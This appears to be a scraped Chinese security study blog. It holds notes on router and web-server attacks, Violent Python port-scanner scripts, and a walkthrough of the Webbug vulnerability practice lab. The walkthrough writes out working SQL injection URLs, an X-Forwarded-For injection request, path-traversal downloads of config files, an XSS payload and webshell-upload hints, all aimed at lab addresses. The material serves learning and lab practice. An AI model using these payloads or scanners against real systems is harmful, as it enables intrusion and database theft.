-    <article id="post-路由器安全"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/07/29/路由器安全/">家用路由器安全</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/07/29/路由器安全/" class="article-date">
-	  <time datetime="2017-07-29T15:53:56.000Z" itemprop="datePublished">2017-07-29</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="家用路由器安全"><a href="#家用路由器安全" class="headerlink" title="家用路由器安全"></a>家用路由器安全</h1><p><a href="http://shackles.top/2017/08/09/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AE%89%E5%85%A8/"> 2017-08-09</a></p>
-<h3 id="路由器安全"><a href="#路由器安全" class="headerlink" title="路由器安全"></a>路由器安全</h3><h3 id="CGI-程运行"><a href="#CGI-程运行" class="headerlink" title="CGI 程运行"></a>CGI 程运行</h3><ol>
-<li>请求处理：客户端http请求 http server CGI</li>
-<li>CGI程序返回结果</li>
-<li>攻击CGI 程序<ol>
-<li>在同一个请求中无法进行多次交互；</li>
-</ol>
-</li>
-<li>binwak</li>
-<li>漏洞利用<ol>
-<li>busybox 提权</li>
-<li>自己编译shellcode</li>
-<li>sleep(1)​</li>
-</ol>
-</li>
-<li>路由器web漏洞<ol>
-<li>xss</li>
-<li>csrf</li>
-<li>认证漏洞</li>
-<li>命令注入</li>
-<li>lua</li>
-</ol>
-</li>
-</ol>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/物联网安全/">物联网安全</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-Web 服务端安全"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/06/29/Web 服务端安全/">Web 服务端安全</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/06/29/Web 服务端安全/" class="article-date">
-	  <time datetime="2017-06-29T15:53:56.000Z" itemprop="datePublished">2017-06-29</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Web-服务端安全"><a href="#Web-服务端安全" class="headerlink" title="Web 服务端安全"></a>Web 服务端安全</h1><p><a href="http://shackles.top/2016/10/05/Web%20%E6%9C%8D%E5%8A%A1%E7%AB%AF/"> 2016-10-05</a></p>
-<h3 id="Web-服务端"><a href="#Web-服务端" class="headerlink" title="Web 服务端"></a>Web 服务端</h3><h5 id="web"><a href="#web" class="headerlink" title="web"></a>web</h5><p>web服务端 逆向的过程；</p>
-<h4 id="SQL-注入"><a href="#SQL-注入" class="headerlink" title="SQL 注入"></a>SQL 注入</h4><p>1.$user=admin’or 1=1#</p>
-<ol>
-<li>Union 注入<ol>
-<li>有回显</li>
-<li>猜解出来字段</li>
-<li>可以填充查询结果</li>
-</ol>
-</li>
-<li>数据库报错；</li>
-<li>Boolean 盲注（在木有数据回显）<ol>
-<li>Timing 盲注<br>2 if（1，name，price）</li>
-</ol>
-</li>
-</ol>
-<p>if(select(flag)，name，price）</p>
-<h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h4><ol>
-<li>读取敏感文件</li>
-<li>包含一句话getshell</li>
-<li>创建临时文件</li>
-<li>​</li>
-</ol>
-<p><a href="http://58.154.33.13:8004/show.php?id=1502009577&amp;type=zip" target="_blank" rel="noopener">http://58.154.33.13:8004/show.php?id=1502009577&amp;type=zip</a></p>
-<p>123‘’,../../../../../../../etc/password#</p>
-<p><a href="https://zhuanlan.zhihu.com/p/26308699" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/26308699</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web安全/">Web安全</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-Violent Python"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/04/07/Violent Python/">Violent Python</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/04/07/Violent Python/" class="article-date">
-	  <time datetime="2017-04-07T15:53:56.000Z" itemprop="datePublished">2017-04-07</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Violent-Python"><a href="#Violent-Python" class="headerlink" title="Violent Python"></a>Violent Python</h1><p><a href="http://shackles.top/2017/04/07/violent%20python%20%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0%E7%AC%AC%E4%BA%8C%E7%AB%A0/"> 2017-04-07</a></p>
-<h1 id="用pyhon进行渗透测试"><a href="#用pyhon进行渗透测试" class="headerlink" title="用pyhon进行渗透测试"></a>用pyhon进行渗透测试</h1><h2 id="2-1-编写端口扫描"><a href="#2-1-编写端口扫描" class="headerlink" title="2.1 编写端口扫描"></a>2.1 编写端口扫描</h2><h3 id="2-1-1-TCP全连接扫描"><a href="#2-1-1-TCP全连接扫描" class="headerlink" title="2.1.1 TCP全连接扫描"></a>2.1.1 TCP全连接扫描</h3><ol>
-<li>TCP 全连接扫描：socket 和 optpares</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">socket.gethostbyname(hostname) \\</span><br><span class="line">socket.gethostbyaddr(ip addreess) \\</span><br><span class="line">socket.socket(\[family\[,type\[,proto]]])\\</span><br><span class="line">socket.create_connection(addrees\[,timeout\[,surece_address]])</span><br></pre></td></tr></table></figure>
-<ol>
-<li>​</li>
-</ol>
-<p>optparse 模块是python的内建模块应用于处理命令行。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from optparse import OptionParser  </span><br><span class="line">[...]  </span><br><span class="line"></span><br><span class="line">parser = OptionParser()  </span><br><span class="line"></span><br><span class="line">parser.add_option(&quot;-f&quot;, &quot;--file&quot;, dest=&quot;filename&quot;,  </span><br><span class="line">                  help=&quot;write report to FILE&quot;, metavar=&quot;FILE&quot;)  </span><br><span class="line">parser.add_option(&quot;-q&quot;, &quot;--quiet&quot;,  </span><br><span class="line">                  action=&quot;store_false&quot;, dest=&quot;verbose&quot;, default=True,  </span><br><span class="line">                  help=&quot;don&apos;t print status messages to stdout&quot;)  </span><br><span class="line">  </span><br><span class="line">(options, args) = parser.parse_args()</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">故命令行可以使用：</span><br><span class="line"></span><br><span class="line">usage: &lt;yourscript&gt; [options]  </span><br><span class="line">  </span><br><span class="line">options:  </span><br><span class="line">  -h, --help            show this help message and exit  </span><br><span class="line">  -f FILE, --file=FILE  write report to FILE  </span><br><span class="line">  -q, --quiet           don&apos;t print status messages to stdout</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="2-2-2-抓取应用的Banner"><a href="#2-2-2-抓取应用的Banner" class="headerlink" title="2.2.2 抓取应用的Banner"></a>2.2.2 抓取应用的Banner</h3><h3 id="2-2-3-线程扫描"><a href="#2-2-3-线程扫描" class="headerlink" title="2.2.3 线程扫描"></a>2.2.3 线程扫描</h3><p>python-nmap 利用python 调用nmap</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">TCP SYN 扫描 ：又称为半开放扫描，这种类型的扫描发送一个SYN的TCP连接数包等待响应，当返回RST数据包表示端口关闭，返回ACK数据包表示端口开放。</span><br><span class="line"></span><br><span class="line">TCP NULL 扫描 ：TCP空扫描设置TCP的标志头为零。如果返回一个RST数据包则表示这个端口是关闭的。</span><br><span class="line"></span><br><span class="line">TCP FIN 扫描 : TCP FIN扫描发送一个FIN数据包，主动关闭连接，等待一个圆满的终止，如果返回RST数据包则表示端口是关闭的。</span><br><span class="line"></span><br><span class="line">TCP XMAS 扫描 ：TCP XMAS扫描设置 PSH, FIN,和URG TCP标志位，如返回RST数据包则表示这个端口是关闭的。</span><br></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># -*- by shackle -*-</span><br><span class="line">#  输入主机名与端口-&gt;主机名变为IPV4地址-&gt;</span><br><span class="line">import optparse</span><br><span class="line">import socket</span><br><span class="line">import  threading</span><br><span class="line"></span><br><span class="line">###</span><br><span class="line"># 建立socket连接</span><br><span class="line">def connScan(tgtHost,tgtPort):</span><br><span class="line">    try:</span><br><span class="line">        connSkt = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        connSkt.connect((tgtHost,tgtPort))</span><br><span class="line">        print &apos;[+]%d/tcp open&apos;%tgtPort</span><br><span class="line">        connSkt.close()</span><br><span class="line">    except:</span><br><span class="line">        print &apos;[-]%d/tcp closed &apos;% tgtPort</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## 定义端口扫描函数</span><br><span class="line">def portScan(tgtHost, tgtPorts):</span><br><span class="line">    try:</span><br><span class="line">        tgtIP = socket.gethostbyname(tgtHost)</span><br><span class="line"></span><br><span class="line">    except: </span><br><span class="line">        print &quot;[-] Cannot resolve &apos;%s&apos;: Unknown host&quot; % tgtHost</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        tgtName = socket.gethostbyaddr(tgtIP)</span><br><span class="line">        print &apos;\n[+] Scan Results for: &apos; + tgtName[0]</span><br><span class="line">    except:</span><br><span class="line">        print &apos;\n[+] Scan Results for: &apos; + tgtIP</span><br><span class="line">    socket.setdefaulttimeout(1)</span><br><span class="line">    ### 多线程，多端口</span><br><span class="line">    for tgtPort in tgtPorts:</span><br><span class="line">        print(&apos;Scanning port &apos; + str(tgtPort))</span><br><span class="line">        t = threading.Thread(target=connScan, args=(tgtHost, int(tgtPort)))</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = optparse.OptionParser(&apos;use:  –H &lt;target host&gt; -P &lt;target port&gt;&apos;)  # 新建paser对象</span><br><span class="line">    parser.add_option(&apos;-H&apos;, &apos;--host&apos;, dest=&apos;tgtHost&apos;, type=&apos;string&apos;, help=&apos;taget host&apos;)</span><br><span class="line">    parser.add_option(&apos;-P&apos;, &apos;--port&apos;, dest=&apos;tgtPort&apos;, type=&apos;int&apos;, help=&apos;taget port&apos;)</span><br><span class="line"></span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    # 已经定义好了所有的命令行参数，调用 parse_args() 来解析程序的命令行：</span><br><span class="line">    # options，它是一个对象（optpars.Values），保存有命令行参数值。只要知道命令行参数名，如 file，就可以访问其对应的值： options.file 。</span><br><span class="line">    # args，它是一个由 positional arguments 组成的列表。</span><br><span class="line"></span><br><span class="line">    tgtHost = options.tgtHost</span><br><span class="line">    tgtPort = options.tgtPort</span><br><span class="line">    args.append(tgtPort)  # 设置端口列表</span><br><span class="line">    if (tgtHost == None) | (tgtPort == None):</span><br><span class="line">        print parser.usage</span><br><span class="line">        exit(0)</span><br><span class="line">    portScan(tgtHost,args)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<h3 id="2-2-4-利用NMAP"><a href="#2-2-4-利用NMAP" class="headerlink" title="2.2.4 利用NMAP"></a>2.2.4 利用NMAP</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># -*- by shackle -*-\</span><br><span class="line">#  调用 nmap</span><br><span class="line"></span><br><span class="line">import optparse</span><br><span class="line">import nmap</span><br><span class="line"></span><br><span class="line">def nmapScan(tgtHost, tgtPort):</span><br><span class="line">    nmScan = nmap.PortScanner()</span><br><span class="line">    results = nmScan.scan(tgtHost, tgtPort)</span><br><span class="line">    state = results[&apos;scan&apos;][tgtHost][&apos;tcp&apos;][int(tgtPort)][&apos;state&apos;]</span><br><span class="line">    print(&quot; [*] &quot; + tgtHost + &quot; tcp/&quot; + tgtPort + &quot; &quot; + state)</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = optparse.OptionParser(&apos;usage %prog –H &lt;target host&gt; -P &lt;target port&gt;&apos;)</span><br><span class="line">    parser.add_option(&apos;-H&apos;, dest=&apos;tgtHost&apos;, type=&apos;string&apos;, help=&apos;specify target host&apos;)</span><br><span class="line">    parser.add_option(&apos;-P&apos;, dest=&apos;tgtPort&apos;, type=&apos;string&apos;, help=&apos;specify target port&apos;)</span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    tgtHost = options.tgtHost</span><br><span class="line">    tgtPort = options.tgtPort</span><br><span class="line">    args.append(tgtPort)    </span><br><span class="line">    if (tgtHost == None) | (tgtPort == None):</span><br><span class="line">        print(&apos;[-] You must specify a target host and port[s]!&apos;)</span><br><span class="line">        exit(0)</span><br><span class="line">    for tgport in args:</span><br><span class="line">        nmapScan(tgtHost, tgport)</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/">Python</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-webbug"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/04/05/webbug/">国产Webbug开源漏洞平台</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/04/05/webbug/" class="article-date">
-	  <time datetime="2017-04-05T15:53:56.000Z" itemprop="datePublished">2017-04-05</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>国产的Webbug开源漏洞平台搞一下~</p>
-<p>get注入<br>图片破解<br>信息收集练习——目录端口收集<br>暴力破解练习<br>x-forwarded-for注入<br>支付漏洞<br>垂直越权<br>CSRF<br>url跳转<br>GET任意文件下载<br>POST任意文件下载<br>无验证上传<br>反射型XSS<br>存储型XSS<br>校验扩展名上传<br>验证来源去向的url跳转<br>文件包含<br>POST文件包含<br>HOST注入<br>APK破解<br>延时注入<br>DZ7.2论坛sql注入<br>aspcms注入<br>phpmyadmin任意文件包含漏洞<br>齐博系统SQL注入<br>海盗云商getshell<br>PHP168任意代码执行GET SHELL<br>ecshop 注入<br>ShopXp系统SQL注射漏洞<br>Dcore(轻型CMS系统)注入漏洞<br>MetInfo 任意文件包含漏洞可getshell<br>Metinfo news.php盲注<br>Metinfo img.php盲注<br>万众电子期刊在线阅读系统PHP和ASP最新版本通杀SQL注入<br>BEESCMS sql注入，无视防御<br>ourphp 注入<br>phpwind 命令执行漏洞<br>metinfo 任意用户密码修改<br>DZ 3.2 存储型XSS<br>DedeCMS flink.php友情链接注入<br>DedeCms?recommend.php注入<br>BEESCMS 小于等于V4四处注入+无需密码直接进后台<br>海洋 x-forwarded-for注入<br>php截断利用<br>st2-016<br>jboss命令执行<br>tomcat弱口令<br>hfs远程命令执行<br>st2-052命令执行<br>flash远程命令执行<br>gh0st远程溢出<br>IIS6.0远程溢出</p>
-<h2 id="渗透基础"><a href="#渗透基础" class="headerlink" title="渗透基础"></a>渗透基础</h2><h3 id="第一关-get注入-很简单的一个注入"><a href="#第一关-get注入-很简单的一个注入" class="headerlink" title="第一关:get注入__很简单的一个注入"></a>第一关:get注入__很简单的一个注入</h3><p>GET 手工注入/sqlmap</p>
-<p>1、爆列长     order by 4  为<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' order by 4 %23</span><br></pre></td></tr></table></figure></p>
-<p>回显：不爆错，所以列长是4。</p>
-<p>2、爆表  mysql information_schema  元信息表</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema = database() %23</span><br></pre></td></tr></table></figure>
-<p>回显：comment,flag,goods,user  四个表</p>
-<p>3、爆列</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' union select group_concat(column_name),2,3,4 from information_schema.columns where table_name = 'flag' %23</span><br></pre></td></tr></table></figure>
-<p>回显：id,flag   flag表中的列</p>
-<p>4、查询flag值</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.102.15.214/pentest/test/sqli/sqltamp.php?gid=1' union select 1,flag,3,4 from flag %23</span><br></pre></td></tr></table></figure>
-<p>回显：名称为:204f704fbbcf6acf398ffee11989b377</p>
-<h3 id="第二关-从图片中你能找到什么？"><a href="#第二关-从图片中你能找到什么？" class="headerlink" title="第二关:从图片中你能找到什么？"></a>第二关:从图片中你能找到什么？</h3><p>图片隐写题目 ，  想想之前misc 题目做的想吐。</p>
-<h3 id="第三关-你看到了什么？"><a href="#第三关-你看到了什么？" class="headerlink" title="第三关:你看到了什么？"></a>第三关:你看到了什么？</h3><p>扫目录。。。emmm</p>
-<h3 id="第四关-告诉你了flang是5位数"><a href="#第四关-告诉你了flang是5位数" class="headerlink" title="第四关:告诉你了flang是5位数"></a>第四关:告诉你了flang是5位数</h3><p><a href="http://10.102.15.214/pentest/test/b2e16da5985ee1be/index.html" target="_blank" rel="noopener">http://10.102.15.214/pentest/test/b2e16da5985ee1be/index.html</a></p>
-<p>bp  抓包爆破弱口令。 admin   admin 123</p>
-<h3 id="第五关-一个优点小小的特殊的注入"><a href="#第五关-一个优点小小的特殊的注入" class="headerlink" title="第五关:一个优点小小的特殊的注入"></a>第五关:一个优点小小的特殊的注入</h3><p>XFF 头注入</p>
-<p>浅谈http头注入(附案例)<br><a href="https://zhuanlan.zhihu.com/p/27553821" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/27553821</a></p>
-<p>User-Agent：使得服务器能够识别客户使用的操作系统，游览器版本等.（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）</p>
-<p>Cookie：网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据（通常经过加密）.</p>
-<p>X-Forwarded-For：简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP,（通常一些网站的防注入功能会记录请求端真实IP地址并写入数据库or某文件[通过修改XXF头可以实现伪造IP]）.</p>
-<p>Clien-IP：同上，不做过多介绍.</p>
-<p>Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过    来的.</p>
-<p>Host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号(这个我本人还没碰到过，不过有真实存在的案例还是写上吧).</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /pentest/test/1/ HTTP/1.1</span><br><span class="line">Host: 10.102.15.214</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: HFS_SID_=0.630969217978418</span><br><span class="line">Content-Length: 0</span><br><span class="line">X-Forwarded-For:union select 1,flag,3,4 from flag</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
-<h3 id="第六关-这关需要rmb购买哦"><a href="#第六关-这关需要rmb购买哦" class="headerlink" title="第六关:这关需要rmb购买哦"></a>第六关:这关需要rmb购买哦</h3><p>截获数据包进行修改数量  逻辑漏洞</p>
-<h3 id="第七关-越权"><a href="#第七关-越权" class="headerlink" title="第七关:越权"></a>第七关:越权</h3><p>越权修改密码</p>
-<p><a href="http://10.102.15.214/pentest/test/3/change.php?name=admin" target="_blank" rel="noopener">http://10.102.15.214/pentest/test/3/change.php?name=admin</a></p>
-<h3 id="第八关-CSRF"><a href="#第八关-CSRF" class="headerlink" title="第八关:CSRF"></a>第八关:CSRF</h3><p>将更改密码的请求用Burpsuite截获 可一键生成CSRF PoC</p>
-<h3 id="第九关-URL跳转"><a href="#第九关-URL跳转" class="headerlink" title="第九关:URL跳转"></a>第九关:URL跳转</h3><p><a href="http://10.102.15.214/pentest/test/5/index.php?url=http://www.baidu.com" target="_blank" rel="noopener">http://10.102.15.214/pentest/test/5/index.php?url=http://www.baidu.com</a></p>
-<h3 id="第十关-文件下载"><a href="#第十关-文件下载" class="headerlink" title="第十关:文件下载"></a>第十关:文件下载</h3><p><a href="http://10.102.15.214/pentest/test/6/1/download.php" target="_blank" rel="noopener">http://10.102.15.214/pentest/test/6/1/download.php</a></p>
-<p>任意文件下载  payload：  下载  config.php</p>
-<p><a href="http://10.102.15.214/pentest/test/6/1/download.php?fname=../../..//pentest/test/6/1//db/config.php" target="_blank" rel="noopener">http://10.102.15.214/pentest/test/6/1/download.php?fname=../../..//pentest/test/6/1//db/config.php</a></p>
-<h3 id="第十一关-我和上一题有点像"><a href="#第十一关-我和上一题有点像" class="headerlink" title="第十一关:我和上一题有点像"></a>第十一关:我和上一题有点像</h3><p>的确和上一关有点像 也是要找回mysql账号密码 还是先把下载的包抓下来看看 上一关的下载用的是get 本关用的post</p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com/\img1522055666619.png?lastModify=1522056169" alt="img"><br><img src="http://oizzgpxb7.bkt.clouddn.com/\1522056171589.png" alt="52205617158"></p>
-<h3 id="第十二关-我系统密码忘记了！"><a href="#第十二关-我系统密码忘记了！" class="headerlink" title="第十二关:我系统密码忘记了！"></a>第十二关:我系统密码忘记了！</h3><p>​    上传漏洞的连接菜刀。</p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522056297807.png" alt="52205629780"></p>
-<h3 id="第十三关-XSS"><a href="#第十三关-XSS" class="headerlink" title="第十三关:XSS"></a>第十三关:XSS</h3><p>反射型 xss</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.102.15.214/pentest/test/9/?id=&lt;img src onerror=al ert()&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522056415953.png" alt="52205641595"></p>
-<h3 id="第十四关-存储型XSS"><a href="#第十四关-存储型XSS" class="headerlink" title="第十四关:存储型XSS"></a>第十四关:存储型XSS</h3><p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522056469320.png" alt="52205646932"></p>
-<h3 id="第十五关-什么？图片上传不了？"><a href="#第十五关-什么？图片上传不了？" class="headerlink" title="第十五关:什么？图片上传不了？"></a>第十五关:什么？图片上传不了？</h3><p>只验证了Content-Type </p>
-<p>抓包改。。。</p>
-<h3 id="第十六关-明天双十一"><a href="#第十六关-明天双十一" class="headerlink" title="第十六关:明天双十一"></a>第十六关:明天双十一</h3><h2 id="中级进阶"><a href="#中级进阶" class="headerlink" title="中级进阶"></a>中级进阶</h2><h3 id="第一关-出来点东西吧-任意文件读取"><a href="#第一关-出来点东西吧-任意文件读取" class="headerlink" title="第一关:出来点东西吧  任意文件读取"></a>第一关:出来点东西吧  任意文件读取</h3><p>get 方式文件包含漏洞</p>
-<p><a href="http://10.102.94.210/pentest/test/13/?country=../../../index.html" target="_blank" rel="noopener">http://10.102.94.210/pentest/test/13/?country=../../../index.html</a></p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522062643540.png" alt="52206264354"></p>
-<h3 id="第二关-提交方式是怎么样的啊？"><a href="#第二关-提交方式是怎么样的啊？" class="headerlink" title="第二关:提交方式是怎么样的啊？"></a>第二关:提交方式是怎么样的啊？</h3><p><a href="http://10.102.94.210/pentest/test/14/" target="_blank" rel="noopener">http://10.102.94.210/pentest/test/14/</a></p>
-<p>post 方式文件 文件包含漏洞</p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522062882333.png" alt="52206288233"></p>
-<h3 id="第三关-我还是一个注入"><a href="#第三关-我还是一个注入" class="headerlink" title="第三关:我还是一个注入"></a>第三关:我还是一个注入</h3><p>host 头注入</p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522063148024.png" alt="52206314802"></p>
-<p><img src="http://oizzgpxb7.bkt.clouddn.com/\1522063211793.png" alt="52206321179"></p>
-<h3 id="第四关-APK里面有一个flag"><a href="#第四关-APK里面有一个flag" class="headerlink" title="第四关:APK里面有一个flag"></a>第四关:APK里面有一个flag</h3><p>逆向APK程序</p>
-<h3 id="第五关-时间注入"><a href="#第五关-时间注入" class="headerlink" title="第五关:时间注入"></a>第五关:时间注入</h3><p><a href="http://10.102.94.210/pentest/test/time/" target="_blank" rel="noopener">http://10.102.94.210/pentest/test/time/</a>  </p>
